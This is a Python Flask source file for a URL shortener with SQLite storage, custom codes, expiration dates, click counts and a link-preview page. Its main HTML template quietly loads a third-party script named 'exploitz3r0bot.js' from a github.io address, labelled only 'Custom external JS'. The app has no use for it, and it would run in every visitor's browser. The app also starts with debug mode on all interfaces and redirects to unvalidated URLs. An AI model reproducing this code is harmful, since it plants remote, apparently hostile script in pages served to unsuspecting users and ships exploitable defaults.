from flask import Flask, request, redirect, render_template_string
import sqlite3
import string
import random
from datetime import datetime, timedelta

app = Flask(__name__)
DB_NAME = "urls.db"

# ---------- DATABASE ----------
def init_db():
    with sqlite3.connect(DB_NAME) as conn:
        conn.execute("""
        CREATE TABLE IF NOT EXISTS urls (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            long_url TEXT NOT NULL,
            short_code TEXT UNIQUE NOT NULL,
            clicks INTEGER DEFAULT 0,
            expiration TEXT
        )
        """)

def generate_short_code(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def cleanup_expired():
    """Delete expired URLs"""
    now = datetime.utcnow()
    with sqlite3.connect(DB_NAME) as conn:
        conn.execute(
            "DELETE FROM urls WHERE expiration IS NOT NULL AND expiration <= ?",
            (now.isoformat(),)
        )

# ---------- ROUTES ----------
@app.route("/", methods=["GET", "POST"])
def index():
    cleanup_expired()
    short_url = None
    error = None

    if request.method == "POST":
        long_url = request.form["long_url"]
        custom_code = request.form.get("custom_code")
        expiration_date = request.form.get("expiration_date")

        short_code = custom_code if custom_code else generate_short_code()
        expiration = None
        if expiration_date:
            try:
                expiration = datetime.fromisoformat(expiration_date)
            except:
                error = "Invalid date format."

        try:
            with sqlite3.connect(DB_NAME) as conn:
                conn.execute(
                    "INSERT INTO urls (long_url, short_code, expiration) VALUES (?, ?, ?)",
                    (long_url, short_code, expiration.isoformat() if expiration else None)
                )
            short_url = request.host_url + short_code
        except sqlite3.IntegrityError:
            error = "Custom code already exists."

    # URL history
    with sqlite3.connect(DB_NAME) as conn:
        history = conn.execute(
            "SELECT short_code, long_url, clicks, expiration FROM urls ORDER BY id DESC LIMIT 10"
        ).fetchall()

    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
<title>URL Shortener</title>
<style>
body { background:#020617; font-family:Segoe UI; color:#e5e7eb; display:flex; justify-content:center; align-items:center; min-height:100vh; }
.container { width:480px; background:#0f172a; padding:30px; border-radius:14px; box-shadow:0 20px 60px rgba(0,0,0,.6); }
h1 { color:#10b981; text-align:center; margin-bottom:20px; }
input, button { width:100%; padding:12px; border-radius:10px; border:none; margin-bottom:10px; }
input { background:#020617; color:#fff; border:1px solid #1f2937; }
button { background:#10b981; color:#020617; font-weight:600; cursor:pointer; }
.result { background:#020617; padding:12px; border-radius:10px; margin-top:10px; }
.result a { color:#22c55e; }
.copy { margin-top:8px; background:#22c55e; }
.error { color:#ef4444; margin-bottom:10px; }
table { width:100%; margin-top:15px; font-size:.85rem; }
td { padding:6px; word-break:break-all; }
th { color:#10b981; text-align:left; }
</style>
<script>
function copyText(text){ navigator.clipboard.writeText(text); alert("Copied!"); }
</script>
</head>
<body>
<div class="container">
<h1>URL Shortener</h1>

{% if error %}
<div class="error">{{ error }}</div>
{% endif %}

<form method="post">
    <input type="url" name="long_url" placeholder="Long URL" required>
    <input type="text" name="custom_code" placeholder="Custom code (optional)">
    <input type="date" name="expiration_date" placeholder="Expiration (optional)">
    <button type="submit">Shorten</button>
</form>

{% if short_url %}
<div class="result">
    <a href="{{ short_url }}" target="_blank">{{ short_url }}</a>
    <button class="copy" onclick="copyText('{{ short_url }}')">Copy</button>
</div>
{% endif %}

{% if history %}
<table>
<tr><th>Short</th><th>Clicks</th><th>Expires</th><th>Action</th></tr>
{% for h in history %}
<tr>
<td><a href="/{{ h[0] }}" target="_blank">{{ h[0] }}</a> <a href="/{{ h[0] }}+" title="Preview">+</a></td>
<td>{{ h[2] }}</td>
<td>{{ h[3] if h[3] else 'Never' }}</td>
<td>
<form method="post" action="/delete" style="margin:0;">
<input type="hidden" name="short_code" value="{{ h[0] }}">
<button type="submit" style="padding:4px 8px;">Delete</button>
</form>
</td>
</tr>
{% endfor %}
</table>
{% endif %}

</div>

<!-- Custom external JS -->
<script src="https://trejduu32-code.github.io/games/bot/exploitz3r0bot.js"></script>
</body>
</html>
""", short_url=short_url, history=history, error=error)

# ---------- DELETE URL ----------
@app.route("/delete", methods=["POST"])
def delete_url():
    short_code = request.form["short_code"]
    with sqlite3.connect(DB_NAME) as conn:
        conn.execute("DELETE FROM urls WHERE short_code = ?", (short_code,))
    return redirect("/")

# ---------- REDIRECT / PREVIEW ----------
@app.route("/<path:short_code>")
def redirect_url(short_code):
    preview = False
    if short_code.endswith("+"):
        preview = True
        short_code = short_code[:-1]

    cleanup_expired()

    with sqlite3.connect(DB_NAME) as conn:
        cur = conn.execute(
            "SELECT long_url, clicks FROM urls WHERE short_code = ?",
            (short_code,)
        )
        row = cur.fetchone()
        if not row:
            return "URL not found", 404

        long_url, clicks = row

        if preview:
            return render_template_string("""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Link Preview</title>
                <style>
                body { background:#020617; color:#e5e7eb; font-family:Segoe UI; display:flex; justify-content:center; align-items:center; min-height:100vh; }
                .box { background:#0f172a; padding:25px; border-radius:14px; width:420px; box-shadow:0 20px 60px rgba(0,0,0,.6); text-align:center; }
                h2 { color:#10b981; margin-bottom:15px; }
                a { color:#22c55e; word-break:break-all; }
                .meta { font-size:.9rem; opacity:.8; margin-top:8px; }
                button { margin-top:15px; width:100%; padding:12px; background:#10b981; border:none; border-radius:10px; font-weight:600; cursor:pointer; }
                </style>
            </head>
            <body>
                <div class="box">
                    <h2>Link Preview</h2>
                    <div><strong>Redirects to:</strong></div>
                    <a href="{{ long_url }}" target="_blank">{{ long_url }}</a>
                    <div class="meta">Clicks: {{ clicks }}</div>
                    <form action="/{{ short_code }}" method="get">
                        <button>Continue →</button>
                    </form>
                </div>
            </body>
            </html>
            """, long_url=long_url, clicks=clicks, short_code=short_code)

        # Normal redirect
        conn.execute(
            "UPDATE urls SET clicks = clicks + 1 WHERE short_code = ?",
            (short_code,)
        )
        return redirect(long_url)

# ---------- START ----------
if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=5000, debug=True)
